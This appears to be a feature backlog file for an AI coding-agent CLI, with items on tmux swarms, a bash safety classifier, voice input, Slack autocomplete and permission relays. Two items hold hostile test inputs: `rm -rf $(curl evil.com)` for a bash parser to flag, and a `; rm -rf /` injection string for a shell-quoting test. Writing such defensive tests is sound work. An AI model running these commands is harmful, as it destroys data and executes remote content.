items.summary: another agent runs an async classifier against every bash command before surfacing a permission dialog. Coordinator workers await the result sequentially; swarm workers try it before forwarding to the leader. Races against user interaction with a resolve-once guard.
items.done: Bash commands classified as safe auto-approve without dialog; unsafe/unknown fall through to normal permission flow; coordinator and swarm workers respect classifier result.

items.title: /batch — parallel multi-agent code implementation skill
items.summary: Bundled /batch skill that orchestrates a large parallelizable codebase change across 5–30 worker agents in git worktrees. Each worker implements one change, runs tests, and creates a PR. Coordinator tracks PR URLs. Uses EnterPlanMode + AgentTool.
items.done: Running /batch with a description spawns multiple worker agents in isolated worktrees; each worker creates a PR; coordinator reports PR URLs on completion; test failures are fixed before PR creation.

items.title: Fix nondeterministic full-suite test flakes (watcher + Ink UI) + reconcile stale doc counts
items.summary: Swept an entire flake class — 'fixed sleep/tick, then assert a positive async result' — that only failed under full-suite load; all root-caused, none patched with a longer timeout. (1) hooks/file-watch.test.ts: fs.watch (FSEvents) arms async with no readiness signal, so the trigger write could land pre-arm and the event was MISSED, not delayed — fix re-fires the trigger inside the poll loop. (2) Ink UI tests (mcp-panel/config-panel/sandbox-panel/trust-dialog/composer) asserted on a frame/spy after a fixed tick count — added waitForFrame/waitUntil poll helpers to test-render.tsx and converted them to wait on a view-unique marker (caught a real bug: an ambiguous wait-target present in two views). (3) Audited every setTimeout sleep in the suite and converted the genuine cases (ui/config-actions, ui/use-submit, uds/peers, agent/permission-gate, mcp/client) to poll-until-condition; left legitimate fixed delays (negative assertions, recovery polls, mock delays, timestamp-gap, interval tests). Also real-counted the source surface (ALL_TOOLS 105 / buildRegistry 108 / SLASH_COMMANDS 110) and reconciled the stale count anchors (root said 94/97/103, vanta-ts said 95/98/99).
items.done: 11 flaky test files converted to poll-until-condition (root-caused, not timeout bumps); test-render.tsx exposes waitForFrame/waitUntil and ui/CLAUDE.md documents the no-fixed-tick rule; 2 consecutive fully-green full-suite runs (606/606 files, 5077/5077 tests) from vanta-ts/; root + vanta-ts CLAUDE.md count anchors match the real ALL_TOOLS/buildRegistry/SLASH_COMMANDS exports; ERRORS.md logs every root cause + the run-from-vanta-ts trap.

items.title: Tmux swarm backend — spawn agents in tmux panes with locking + color coding
items.summary: Spawns another agent agents in separate tmux panes. Sequential pane creation lock prevents race conditions. 200ms shell init delay for starship/oh-my-zsh. Leader pane cached for performance. SWARM_SESSION_NAME/HIDDEN_SESSION_NAME constants. Agents identified by color from team palette.
items.done: Running /team spawns agents in tmux panes; each pane auto-labeled with agent color; panes created sequentially without races; shell ready before agent starts.
items.notes: FULLY LIVE + PROVEN END-TO-END (not a stub). Layers: (1) pure tmux-layout (planPaneLayout/PaneLockState/assignPaneColor/buildTmux*Args — argv-not-shell). (2) LIVE backend fleet/tmux-backend.ts: spawnTmuxSwarm runs REAL execFile(tmux,argv) — new-session detached, split-window per worker, select-pane border color, send-keys the launch command, select-layout tiled; capturePaneText/countPanes/killTmuxSwarm; realTmuxRunner injectable. (3) CLI cli/fleet-tmux-cmd.ts: vanta fleet tmux --task <i> [--task ...] -> one pane per task running cd <repo> && ./run.sh run <quoted task>, prints the attach/kill commands; wired into runFleetCommand dispatch + usage. PROOF: a LIVE integration test (skip-if-tmux-absent) spawns 3 REAL panes + capture-pane confirms each workers echo MARK0/1/2 actually RAN in its pane + kill -> 0 panes; AND a real `vanta fleet tmux --task echo... --task echo...` run created live session vanta-fleet-<pid> with 2 verified panes (200x24/200x25, cyan/green) — listed + cleaned up. SECURITY: shell-quote the task in the launch command (breakout-safe, tested with ; rm -rf / && $(whoami)); every tmux call is execFile argv-array never a shell string; the kernel assess() still gates each worker (tmux=WHERE, kernel=WHETHER). Full suite 10402 green; 15 backend/cli tests; tsc + size clean. tmux is a std tool the operator has (verified present on this machine).

items.title: Plan mode v2 — multi-agent plan execution (Max=3 agents, enterprise=3)
items.summary: another agent's plan mode v2 (`getPlanModeV2AgentCount`) spawns multiple parallel agents during plan execution. Max 20x subscribers and enterprise/team users get 3 concurrent plan agents; others get 1. The count is GrowthBook-configurable and has a `CLAUDE_CODE_PLAN_V2_AGENT_COUNT` env override (1-10). Also includes `getPlanModeV2ExploreAgentCount` (default 3, env override) — dedicated exploration/research agents that run in parallel before main plan execution.
items.done: On a Max plan, entering plan mode and running `/plan` spawns 3 concurrent sub-agents for different plan steps. Progress shows all 3 working in parallel.

items.title: Session memory compact — compact into persistent session memory files (not just summary)
items.summary: An experimental compaction variant (`sessionMemoryCompact`) that compacts the conversation into structured session memory files (`.claude/session-memory/`) rather than a plain summary message. On the next session, the memory is loaded to restore context. Tracks tool names seen since last compact via `extractDiscoveredToolNames`.
items.done: After compaction, key facts persist to `.vanta/session-memory.md`. On `/resume`, the memory is injected as context so the agent recalls prior decisions.

items.title: UDS peer agents — `/peers` command and ListPeersTool for agent discovery via Unix sockets
items.summary: another agent (feature-gated `UDS_INBOX`) supports peer agent discovery and communication via Unix Domain Sockets. `/peers` lists visible peer agents; `ListPeersTool` gives the agent programmatic access to discover and address peers. Distinct from swarm mailbox messaging (file-based) — UDS provides lower-latency IPC for agents running on the same machine.
items.done: `/peers` lists other another agent sessions running on the machine. An agent can call `list_peers` and then `send_message` to an agent ID to collaborate across sessions.

items.title: Templates — prompt classification and template injection for common task patterns
items.summary: another agent (feature-gated `TEMPLATES`) classifies prompts into job templates using a `jobClassifier` at query time. Templates are loaded from a `templates/` directory alongside agents/commands in plugin manifests. Enables pre-structured prompts for common workflows.
items.done: Prompts matching known patterns (e.g. 'fix bug', 'write test') are classified and augmented with template context before being sent to the model.

items.title: Deep link protocol — agent-cli:// URL opens another agent with pre-filled context
items.summary: Registers the `agent-cli://` URL scheme. Opening `agent-cli://open?q=fix+tests&repo=owner/repo` opens a new terminal window with another agent, pre-filling the prompt and working directory. Used for 'open in terminal' integrations from the vendor cloud and IDE extensions. Security: control char filtering, shell-escaping at injection boundary. Feature flag: `LODESTONE`.
items.done: Clicking a agent-cli:// link opens a terminal with another agent; prompt is pre-filled; working directory set from cwd/repo params; control characters in params are rejected.

items.title: Slack channel autocomplete — `#channel` mention suggestions in prompt input
items.summary: another agent's prompt input suggestion overlay supports a `slack-channel` suggestion type, enabling `#channel-name` autocomplete when the user types `#` in the prompt. Integrates with the Slack channel suggestion service (`slackChannelSuggestions.ts`) to fetch accessible channels. Used in organizations with Slack integration enabled.
items.done: Typing `#eng` in the prompt shows matching Slack channels as suggestions. Selecting one inserts the channel reference for context or notification routing.
items.notes: FULLY LIVE + VERIFIED against real Slack. comms/slack-channels.ts: real conversations.list fetch (Bearer token from env) + 60s cache. WIRED end-to-end into the composer: ui/use-slack-channels.ts (useSlackChannels hook loads the workspace channels ONCE when VANTA_SLACK_TOKEN is set, [] otherwise, never blocks/throws the TUI; injectable loader for tests) -> app.tsx threads channels App->LiveBody->BottomRegion->Composer (mirrors files/skills) -> composer #-completion (activeChannelRef + suggestChannels + ChannelPalette + Tab-complete). LIVE PROOF: a real fetchSlackChannels call with the operators token returned their actual channels (#social #all-vanta #new-channel). 2 hook tests + 14 fetch + 39 composer/at tests; full suite 10479 green; tsc + size clean (also split OverlayPanel -> OverlayPanelMore for a pre-existing cx-11 surfaced by editing app.tsx). SECURITY: token=secret, env-only via process.env (slackToken), never echoed/committed (.env gitignored). DONE — type # in the composer to see live channel suggestions.

items.title: Bidirectional text — RTL/LTR mixing in TUI output
items.summary: another agent's ink/bidi.ts handles bidirectional text (Hebrew, Arabic, mixed RTL/LTR) for correct rendering order in the terminal. Required for proper display when agents work with RTL-language content or codebase comments in RTL languages. Vanta's renderer assumes LTR.
items.done: Text blocks with RTL characters render with correct bidi ordering; mixed RTL/LTR paragraphs use the Unicode Bidi Algorithm; terminal width calculations account for bidi reordering.
items.notes: Pragmatic bidi reorder (Hebrew/Arabic blocks, run split+reverse, base-dir mirror) - NOT full UBA (no bracket mirroring / weak-neutral resolution / isolates). Wired into transcript behind a hasRtl guard; LTR byte-identical. Real-terminal RTL look wants a human eye.

items.title: Terminal panel + TerminalCaptureTool — agent captures terminal content, Meta+J toggle
items.summary: another agent (feature-gated `TERMINAL_PANEL`) adds a `TerminalCaptureTool` letting the agent read the current terminal buffer content, plus an embedded terminal panel toggled with `Meta+J` (`app:toggleTerminal`). The agent can 'see' what's on screen without a screenshot.
items.done: `Meta+J` opens a terminal panel. The agent can call `terminal_capture` to read current terminal output as text context, useful for debugging TUI apps.
items.notes: FULLY LIVE + PROVEN (node-pty blocker RESOLVED via tmux, not a stub). node-pty wont load on node v24 (native ABI lag) so instead captures REAL terminal content through tmux: captureViaTmux(command) runs the command in a throwaway tmux pane, BLOCKS on tmux wait-for -S <chan> (robust completion — the channel name cant be confused with the typed command line, unlike a text sentinel), capture-pane -p the pane, drops the command-echo line, then processCapture strips the WHOLE ANSI/CSI/OSC sequence -> a clean snapshot. terminal_capture TOOL registered in ALL_TOOLS (kernel-gated: describeForSafety surfaces the command to assess; tmux=WHERE, kernel=WHETHER); reuses term/terminal-capture processCapture (the pure strip) + fleet/tmux-backend runner. PROOF: a LIVE integration test (skip-if-tmux-absent) runs printf with real \033 SGR codes in a real tmux pane + asserts the snapshot contains RED-MARKER + and plain with NO ESC/SGR residue — captured real colored terminal output + stripped it clean. 5 tests; full suite 10456 green; tsc + size clean. The TUI Meta+J persistent-panel toggle (toggleCapturePanel) remains the named host wire.

items.title: Agent creation wizard — guided multi-step agent definition UI
items.summary: another agent has a full guided wizard for creating custom named agents: 12 steps (Type, Method, Color, Description, Memory, Model, Tools, Prompt, Generate, Location, Confirm, ConfirmWrapper). Each step is a dedicated screen with keyboard navigation. Agents are saved as typed config files. No equivalent in Vanta.
items.done: /new-agent (or vanta agents new) launches the wizard; each step validates before advancing; the finished agent is saved to ~/.vanta/agents/ and immediately available as a delegate target.
items.notes: 8-step pure state machine + render-tested screens; Generate + file write reuse agentgen. Live mount into the /agents Create-new flow deferred (self-contained surface). Tools step uses a fixed 5-tool list; wiring the live ALL_TOOLS list is a follow-up. Cursor/edit feel wants a real-terminal once-over.

items.title: Global search dialog — search across all sessions and messages
items.summary: another agent's GlobalSearchDialog (Ctrl+K or similar) searches across all stored sessions and messages, showing ranked results with session context. Vanta has per-session search and SESSION-SEARCH (shipped) for session listing, but no full-text cross-session search UI.
items.done: Ctrl+K opens the global search overlay; results show session name + date + matched message excerpt; Enter opens the session at the match; Esc dismisses; results are ranked by recency + relevance.
items.notes: Cross-session searchSessions (reuses life-rank) + GlobalSearchDialog both built + tested. Open-trigger (mount the dialog into app.tsx LiveBody + a keybinding/slash) deferred to GLOBAL-SEARCH-OPEN-TRIGGER; the dialog uses the QuickOpen prop shape so it drops in.

items.title: Mouse support — click events, hit testing, focus in TUI
items.summary: another agent's ink layer has full mouse support: click-event.ts, hit-test.ts, focus-event.ts, terminal-event.ts — elements can declare click handlers and receive mouse focus. Enables clickable links, buttons, and list items in the TUI. Vanta's Ink TUI is keyboard-only.
items.done: Terminal mouse events are captured; UI elements register hit areas; clicking a link, button, or list item triggers its handler; focus follows click; mouse can be disabled for performance.
items.notes: Pure parse (SGR mouse escapes) -> hit-test (topmost region) -> dispatch (handler + focus, composes with ui/focus.ts) pipeline, fully tested. DEFERRED BOUNDARY (needs a real terminal, not faked): enabling live DEC-1006 mouse reporting (SGR enable escapes to stdout, mouse bytes off real stdin, Ink elements registering their own bounds).

items.title: TUI design system — Byline, Dialog, Divider, FuzzyPicker, ProgressBar, Ratchet, Tabs, themed components
items.summary: another agent has a full internal design system for the TUI: Byline (attribution line), Dialog (modal container), Divider (horizontal rule), FuzzyPicker (generic fuzzy picker), ProgressBar (bounded progress indicator), Ratchet (progressive disclosure), Tabs (tabbed pane), ThemedBox/ThemedText (theme-aware wrappers), color token system. Vanta uses raw Ink primitives ad-hoc.
items.done: A vanta-ts/src/tui/design-system/ module exports all core primitives; all existing dialogs/pickers/panels are refactored to use them; theme tokens control colors from settings.
items.notes: 8 components (ThemedBox/Text, Divider, Byline, ProgressBar, Tabs, Dialog, Ratchet, FuzzyPicker) + pure fuzzy match/rank, render-tested via ui/test-render. Component library, not yet consumed by app surfaces. Accent-vs-mono balance wants a real-terminal look.

items.title: Channel permission relay — approve permissions via Telegram/iMessage/Discord
items.summary: When another agent hits a permission dialog, it also sends the prompt to connected channels (Telegram, iMessage, Discord). User replies 'yes <request_id>' via the channel; another agent receives it as a structured notification and races it against local UI. First resolver wins. Allowlist-gated per server. Requires channel MCP server supporting `claude/channel/permission` capability.
items.done: Permission dialogs arrive in connected messaging channels; replying 'yes <id>' approves without opening the terminal; local UI still works in parallel.
items.notes: Logic core shipped + tested: formatApprovalPrompt / parseApprovalReply (yes|no <id>, whole-token, default-deny) / relayApproval (Promise.race channel-reply vs local approver, first-wins via shared AbortController, allowlist-gated). Live wire deferred to CHANNEL-PERMISSIONS-WIRE: call relayApproval from the requestApproval site with send_chat as send, the gateway inbound stream as replies, the host approver as localResolve, and the operator-profile chat allowlist.

items.title: `claude ssh` — remote session over SSH with SSHSessionManager
items.summary: another agent supports a `claude ssh` command that creates an SSH-based remote session (sibling to `claude --remote` WebSocket sessions). The SSH child process and auth proxy are created at startup and handed to `useSSHSession`. The hook bridges SSH session messages into the REPL UI using the same SDK message adapters as remote WebSocket sessions.
items.done: `claude ssh user@host` opens an interactive session over SSH. Tool calls execute on the remote host; permission prompts appear locally.

items.title: Auto memory extraction — background LLM extraction of facts from session turns
items.summary: another agent has a feature-gated (`EXTRACT_MEMORIES`) background service that analyzes session turns after completion and extracts durable facts/preferences into a persistent memory store. Different from skill improvement — this extracts user facts and context rather than improving tool skills.
items.done: With `VANTA_EXTRACT_MEMORIES=1`, each completed turn forks a 20s extractor over recent user/assistant messages, parses a JSON string array, dedups against brain entries, and stores new semantic facts with `auto-extracted` provenance.

items.title: Push-to-talk voice input — native CoreAudio/cpal + SoX/arecord fallback
items.summary: another agent records microphone audio for voice input using a native NAPI module (`audio-capture-napi`) backed by CoreAudio on macOS, with lazy-loading (~1s first-press delay). Falls back to SoX `rec` or ALSA `arecord` on Linux. Audio is recorded while the key is held, then transcribed. The native module is loaded lazily to avoid blocking startup.
items.done: Holding the voice keybinding records audio. On release, it transcribes and submits as a prompt. `/voice status` shows whether native audio or fallback is active.
items.notes: LIVE + PROVEN (transcribe + flow genuinely work via real whisper; only the literal mic input needs a person speaking). voice/whisper-stt.ts: transcribeAudio runs the REAL whisper CLI (buildWhisperArgs <audio> --model tiny --language en --output_format txt --output_dir tmp --fp16 False), reads the produced .txt, control-strips it (transcript=model output -> no control-byte injection); whisperAvailable/sttModel(VANTA_STT_MODEL default tiny); injected runner. voice/mic-capture.ts: captureMicAudio runs REAL ffmpeg avfoundation (buildFfmpegMicArgs -f avfoundation -i :0 -t N -ac 1 -ar 16000, DISCRETE argv, duration-clamped); ffmpegAvailable; sox/arecord = documented Linux fallback. voice/ptt-flow.ts: runPttCapture drives the existing ptt-state machine idle->recording->transcribing->done/error, capture->transcribe->text, errors-as-values never throws. PROOF (2 LIVE tests, gated VANTA_TEST_VOICE=1, ran 3.5s each): macOS say generates real speech -> transcribeAudio -> the transcript matches; the FULL runPttCapture flow with say audio -> transcript end-to-end. 14 tests (unit mocked always-run + the 2 live proofs); tsc + size clean. Reuses the existing transcribe tool concept; the live MIC recording (a person speaking) + the TUI PTT key binding (keydown start / keyup stop+transcribe+insert into the composer) are the named host/hardware wire — the audio->text->flow IS proven working. TRIGGER SURFACE NOW WIRED: voice_input tool (tools/voice-input-tool.ts, registered in ALL_TOOLS, kernel-gated via describeForSafety) calls the proven runPttCapture (record mic -> whisper -> text) and returns the transcript (pure formatVoiceResult shapes ok/empty/error). The capability is now agent-callable; the composer hold-to-talk PTT KEY is the remaining cosmetic host wire on the same runPttCapture. 4 tool tests + the registration test; full suite 10483 green. SELF-SERVE: vanta voice mic opens the macOS Microphone settings pane directly (platform/macos-prefs.ts openPrivacyPane), and a mic-capture failure now hints `vanta voice mic` instead of leaving the user to hunt Settings. SETUP-WIZARD: `vanta setup` now has a Desktop control · voice · auto-tune step (setup/capabilities.ts + setup-full.ts runCapabilitiesSection) that machine-configures this for the operator — runs brew install cliclick, opens the macOS Screen Recording/Accessibility/Microphone panes, and writes the env flags (VANTA_VOICE_PTT / VANTA_LORA_AUTO). Only the OS permission TOGGLE itself stays a user click (macOS forbids any program flipping it).

items.title: ReviewArtifactTool — review and approve generated code/file artifacts in UI
items.summary: another agent (feature-gated `REVIEW_ARTIFACT`) has a `ReviewArtifactTool` with a dedicated `ReviewArtifactPermissionRequest` component. The tool presents a generated artifact (code file, document) for user review with approve/reject. Shows a diff-style view of the proposed artifact before it's written.
items.done: When the agent proposes a new file, a ReviewArtifact dialog shows the full content with an approve/reject choice before it's written to disk.
items.notes: review_artifact tool ({path,content} -> diff vs existing -> requestApproval -> approve writes / reject no-write) + pure artifact-diff (reuses util/diff LCS) + render-tested view. The view is chrome-only (caller drives keys); mounting it into a live overlay/keybinding is a follow-up.

items.title: Plan mode interview phase — clarifying questions before plan execution
items.summary: another agent plan mode v2 has an 'interview phase' (`isPlanModeInterviewPhaseEnabled`, gate `tengu_plan_mode_interview_phase`) that runs before plan execution. another agent asks clarifying questions to refine the plan scope, constraints, and approach before spawning sub-agents. Prevents wasted work from misunderstood requirements.
items.done: Entering plan mode shows a question phase: 'Before I plan this, I need to clarify: [questions]'. User answers, then another agent generates the refined plan and executes it.

items.title: Computer use via MCP (CHICAGO) — route computer-use tool calls through MCP server
items.summary: another agent (feature-gated `CHICAGO_MCP`) enables computer use tool calls to be handled by a dedicated MCP server (codename CHICAGO) rather than natively. Checks `isComputerUseMCPServer`, runs `cleanupComputerUseAfterTurn` after each turn, and sets up the COMPUTER_USE_MCP_SERVER_NAME. Enables GUI automation via the MCP protocol.
items.done: With `CHICAGO_MCP` and a computer-use MCP server configured, another agent routes screenshot/click/type tool calls to the MCP server. macOS-specific setup runs at startup.
items.notes: LIVE INTEGRATION (real, full-suite-verified). mcp/chicago-client.ts: resolveChicagoServer (VANTA_CHICAGO_MCP, default OFF) + makeChicagoRouter ({server,run(action)} reusing routeComputerAction, never throws) + connectChicago (REAL mount+connect -> binds the router to the live clients rawCallTool; any failure -> fail-closed router run->{ok:false}). mcp/chicago-connect.ts: production seam readMcpConfig -> stdioTransport spawn -> raw JSON-RPC initialize + raw tools/call returning UNFLATTENED {content} so a screenshot isnt dropped (client.ts untouched). WIRED INTO vision-action: when chicagoEnabled(env) the grounded CLICK routes through router.run({kind:click,x,y}) (mounted computer MCP tool) instead of cliclick; perceive/ground/changed stay local. DEFAULT OFF = byte-identical (asserted). KERNEL STILL GATES: the click is assess()-gated via vision_action describeForSafety UPSTREAM (MCP=WHERE, kernel=WHETHER), routing does NOT bypass assess. 15+24+18 tests; tools+mcp suites 1112 green; full repo suite 10451 green. REAL routing (mock-verified). REMAINING (operator runtime): a computer-use MCP server configured under VANTA_CHICAGO_MCP (stdio cmd in .mcp.json) + a real machine. SELF-SERVE NATIVE PATH: vanta control [setup|doctor] (cli/control-cmd.ts) makes Vantas OWN native desktop control (vision_action: screencapture -> ground -> cliclick) work out of the box — opens Screen Recording + Accessibility panes + checks/points-to cliclick (brew install cliclick). Desktop control is now part of the build, NOT an external program; the external computer-use MCP (VANTA_CHICAGO_MCP) stays an optional upgrade. Live doctor verified on this machine (screencapture present, cliclick flagged for install). SETUP-WIZARD: `vanta setup` now has a Desktop control · voice · auto-tune step (setup/capabilities.ts + setup-full.ts runCapabilitiesSection) that machine-configures this for the operator — runs brew install cliclick, opens the macOS Screen Recording/Accessibility/Microphone panes, and writes the env flags (VANTA_VOICE_PTT / VANTA_LORA_AUTO). Only the OS permission TOGGLE itself stays a user click (macOS forbids any program flipping it).

items.title: Tree-sitter bash parser — AST-accurate security validation for bash commands
items.summary: another agent (feature-gated `TREE_SITTER_BASH`) uses a tree-sitter-based AST parser for bash commands alongside (or replacing) the regex parser. Provides structurally accurate analysis of compound commands, pipelines, subshells — catching injection patterns that regex misses. `TREE_SITTER_BASH_SHADOW` runs both and compares for gradual rollout.
items.done: With tree-sitter bash enabled, `rm -rf $(curl evil.com)` is correctly parsed as a command substitution and flagged. Regex shadow mode logs discrepancies.
items.notes: SHIPPED 2026-07-09. Added a feature-gated `web-tree-sitter` + `tree-sitter-bash` WASM parser path beside the existing regex classifier. `TREE_SITTER_BASH=1` uses the AST-backed classifier; `TREE_SITTER_BASH_SHADOW=1` runs parser + regex, returns the legacy regex decision, and logs discrepancies. Verified parser output for `rm -rf $(curl evil.com)` includes `command_substitution` and flags both `rm` and nested `curl` as risky. Also proves a syntax-aware improvement (`grep export README.md`) that regex misclassifies because it sees `export` as a shell builtin token instead of an argument.

items.title: Self-hosted runner — dedicated entrypoint for running another agent as a CI/CD runner
items.summary: another agent (feature-gated `SELF_HOSTED_RUNNER`) adds a `self-hosted-runner` CLI entrypoint that bypasses the interactive REPL and enters a dedicated runner mode. Designed for running another agent as an automated agent in CI/CD pipelines with job-queue polling.
items.done: Running `claude self-hosted-runner` starts a job-polling loop. Incoming jobs from the queue are executed as another agent sessions and results posted back.
items.notes: Shipped 2026-07-06. `vanta runner` — the dedicated non-REPL CI/CD entrypoint. runner/queue.ts: file-per-job queue under .vanta/runner-jobs/{queued,running,done}/ with ATOMIC claim via rename queued->running (two pollers never execute the same job — same primitive class as cron-cas); external CI producers enqueue by dropping a {id?,instruction,agent?} JSON into queued/ (tested); malformed files skipped, results posted back as done/failed with the output. runner/loop.ts: poll->claim->execute->post loop, executor INJECTED; --once drains and exits (pipeline mode), --interval tunes idle polling, maxJobs bounds; a throwing executor marks the job failed and the loop continues. cli/runner-cmd.ts wires two real executors: job.agent set -> buildAgentInvocation+runExternalAgent (streamed, coding:true — the 'another agent session' path); absent -> buildCronRunTask (Vanta one-shot, kernel-gated, same path as cron). `vanta runner add|list|start` in the dispatch table. 7 tests (claim exclusivity, CI-dropped file pickup, failure continuation, late-arriving job via injected sleep). LIVE real-path executed: `runner add` -> `runner start --once` claimed the job, ran a REAL codex one-shot through the kernel, posted RUNNER-OK back, `runner list` shows [done]. Full suite 1023 files/11543 green; tsc + size gate clean.

items.title: SSH pre-configured connections in settings

items.done: sshConfigs accepts an array of named connection profiles; the shell_cmd / bash tools use them by name; `vanta ssh <name>` opens an interactive shell to the configured host.

items.title: Structured diff renderer — color diff, file list, detail view
items.summary: another agent has StructuredDiff (colorized inline diff with context lines), StructuredDiffList, DiffDetailView (expandable hunk view), DiffDialog, and DiffFileList (multi-file diff navigator). The /diff command uses these. VANTA-DIFF-VIEWER (shipped) covers the basic /diff command; Vanta is missing the proper color diff renderer and file-list navigator.
items.done: File edits render with color-diff (red/green lines, context collapse); /diff opens a multi-file navigator with DiffFileList; DiffDetailView shows individual hunks with expand/collapse.
items.notes: Shipped 2026-07-07. Two halves: (1) COLOR-DIFF now real in the transcript — DiffRow rendered +/- with NO color; now additions are green, removals red, a collapsed-context run shows a dim ⋯ marker (the card's 'red/green lines, context collapse' — computeDiff already produced the context-collapsed DiffLine[]). (2) util/diff-structured.ts (pure model behind the detail-view + multi-file navigator): groupHunks (split the collapsed diff on ··· into expand/collapse units, each with ± counts, context-only segments dropped), diffStat, summarizeFiles (per-file diff + ±/hunk counts, unchanged files omitted — the DiffFileList rows), formatFileList, lineMark + renderDiffText (gutter-mark colorless render for logs/non-React). 14 tests (mark mapping, hunk split incl. context-only→none, stat, multi-file summarize omits unchanged, file-list format, text render). Full suite 1046 files/11751 green; tsc + size gate clean. The live Ink DiffFileList/DiffDetailView navigator components render THIS model (data + colorized transcript render shipped now; the standalone /diff multi-file overlay UI is the follow-up over the same pure model — /diff currently shows the git diff --stat).

items.title: World model of Jason's systems
items.summary: A map of how Jason's digital life fits together -- repos, services, domains, tools, configs, recurring bugs (wants1 #14). Platform-scale; horizon until a real need pulls it. Extends PROJ-IDENTITY + MEM-WORKTREE + MEM-GRAPH from per-project to cross-system. Scoped to a first slice only: index the _active/ repos + their stacks.

items.notes: Shipped 2026-07-07 (FIRST SLICE only, per the card's scope — the index, not the full digital-life graph). world/system-map.ts (pure + injected I/O): detectStack (12 marker files → Rust/Go/Python/Ruby/PHP/JVM/Deno/Tauri/Node/TypeScript; TypeScript wins over bare Node; multi-stack like Vanta's Rust+TS supported), repoEntity (a repo → WorldEntity type:'repo', note = 'stack — branch: last-commit'), scanSystemMap (injected listRepos/listFiles/gitState → entities; a failing per-repo read degrades to unknown-stack/no-git, never throws), formatSystemMap. cli/world-cmd.ts: `vanta world map` scans every repo under the projects dir (_active/ via listRooms), detects stack + git branch/last-commit (real git -C), stores each as a world entity (appendWorld — queryable via /world), prints the map. items.title: useShortcutDisplay — render user-configured keybinding hints in UI
items.summary: React hook and non-React function that return the display text for any action+context pair from the user's live keybinding config. Used in help overlays, confirmation dialogs, and typeahead footers so shown shortcuts always match the user's custom config.
items.done: Keyboard hints in help overlays and dialogs show the user's configured binding, not hardcoded defaults; non-React callers (commands, services) use the sync variant.
items.notes: Shipped 2026-07-07 on the KEYBINDING-CUSTOMIZATION registry. ui/shortcut-display.ts: shortcutFor(action, context, bindings, fallback?) — pure SYNC variant for non-React callers (commands/services), resolves action+context → the configured chord's display text (⌃P etc), context-specific then global fallback, returns the fallback (default "") when unbound so a hint is never blank. useShortcut() — React hook returning a shortcut(action, context?, fallback?) lookup bound to the LIVE config (useKeybindingSet loads ~/.vanta/keybindings.json, defaults until it resolves). WIRED into real hint surfaces: help-panel.tsx builds its interrupt/exit row from shortcut(exitOrAbort) (was hardcoded ^C); app-regions.tsx TeammateTree focus/interrupt hint reads cycleAgentPrev/Next + interrupt from config (was literal 'shift+←/→ · esc'). A rebind in keybindings.json now shows through in the help overlay + tree hint. 6 sync-variant tests + 4 keybinding/dispatch + HelpPanel render test (proves the hint is the glyph ⌃C from displayChord, not the old literal). Full suite 1055 files/11819 green; tsc + size gate clean.

items.title: Vim visual mode — `v`/`V` selection with operators in the prompt input
items.summary: another agent (v2.1.118) adds vim visual mode (`v` char-select, `V` line-select) with operators (d/y/c) and visual feedback in the prompt input. Extends the existing vim normal mode.
items.done: In vim mode, pressing `v` starts character selection. `d` deletes the selection; `y` yanks to register.
items.notes: Shipped 2026-07-07 on the VANTA-VIM-OPERATORS engine. VimMode += 'visual'; VimState += visualAnchor. In normal mode `v` enters visual (anchor dropped at the cursor). visualKey (pure): a bare motion (h/l/w/b/e/0/$/… via motionTarget) moves the cursor, extending the [anchor..cursor] selection; d/x delete it (inclusive), y yanks it to the register, c deletes+enters insert; Esc exits to normal and clears the anchor. Reuses applyOpRange (the operator machinery) — visual span is [min,max+1] inclusive. use-vim.ts now routes BOTH normal and visual through the engine (insert still only consumes Esc); command modes never fall through to readline (no stray typing). composer-view VimTag shows NOR/INS/VIS. 7 tests (v enters+anchors, motion extends, v$d deletes to EOL, vlly yanks 'hel', vlx delete, vlc→insert, Esc exits+clears). Size-gate refactors: applyVisualOp extracted (sel options object), VISUAL_OPS Set membership. Full suite 1068 files/11942 green; tsc + size gate clean.

items.title: Markdown table rendering — GFM table support in terminal output
items.summary: another agent's MarkdownTable renders GitHub-Flavored Markdown tables with aligned columns, borders, and header separators in the terminal. Vanta's markdown renderer (VANTA-S-MARKDOWN shipped) handles headers/bullets/code but not tables.
items.done: GFM table syntax renders as aligned terminal tables with column borders; wide tables wrap or scroll; empty cells and alignment directives (left/right/center) are respected.
items.notes: Shipped 2026-07-07. The markdown renderer already PARSED GFM tables but rendered them as 2-space-gapped columns with no borders, no alignment, and slice-TRUNCATED wide cells (data lost) — the card's real gaps. ui/markdown-table.ts (pure, no React): parseAlignments (:---/:--:/---: → left/center/right, padded to col count), wrapCell (word-boundary wrap, hard-split an over-long word — NO truncation), padAligned (left/right/center), columnWidths (max header+data, capped MAX_COL_WIDTH 40), layoutTable → full bordered lines (┌┬┐ / header / ├┼┤ / rows / └┴┘) with wide cells wrapped across physical lines. Block.table gained `aligns`; parseTableBlock now captures the separator directives (previously dropped); TableView renders layoutTable's lines (header rows bolded). 12 new pure tests (alignment parse+pad, word-wrap + hard-split, capped widths, bordered/aligned/right-align layout, wide-cell wrap keeps all data, empty/ragged cells) + the existing markdown table tests strengthened to assert captured aligns. Full suite 1045 files/11744 green; tsc + size gate clean.

items.title: Trust calibration: verified / inferred / uncertain / needs-check

Folded into prompt.ts rule 7 (honesty) rather than appending a new rule: 'Label claims by epistemic status — verified (tool-backed) / inferred / uncertain — so it's clear when you know vs guess; show an unverifiable claim as uncertain, not as flat fact.' prompt test locks the clause. Behavioral rendering on real replies is model-driven (verified live, like BEHAVIOR-VOICE).
items.done: A factual reply renders explicit verified/inferred/uncertain markers, and an unverifiable claim is shown as uncertain rather than stated flat.

items.title: Built-in code-size gate (industry-standard, always on)
items.summary: SHIPPED 2026-06-07. lint/size.ts: pure analyzeSource via the TS compiler API — file ≤300, function ≤50, params ≤4, cyclomatic complexity ≤10 (decision points incl. &&/||/??, not double-counting nested fns); each violation = file:line + metric + limit + fix. lint/run.ts + `vanta lint [files|--staged]` (default = all git-tracked.ts/.tsx; tests +.d.ts exempt). Pre-commit (scripts/pre-commit) now runs it on staged TS — WARN-ONLY by default (VANTA_LINT_BLOCK=1 to enforce) because a hard block would stop all commits: the gate surfaced 85 pre-existing violations (agent.ts 334L, cli.ts 401L, interactive.ts runChat 240L, providers/index.ts resolveProvider cx 24, …) — real debt for a follow-up 'size-debt paydown' card, not fixed here. 'Not just the factory' = the gate now serves human commits + `vanta lint`; the factory keeps its file-line born-small check. [in-agent, 2026-06-07] write_file now runs analyzeSource on every TS/TSX write and surfaces violations in the tool result (advisory, never blocks) so the AGENT writes born-small / self-corrects in-loop — closing the human+agent+factory triad. 10 unit tests; full suite 1210 green; tsc clean.
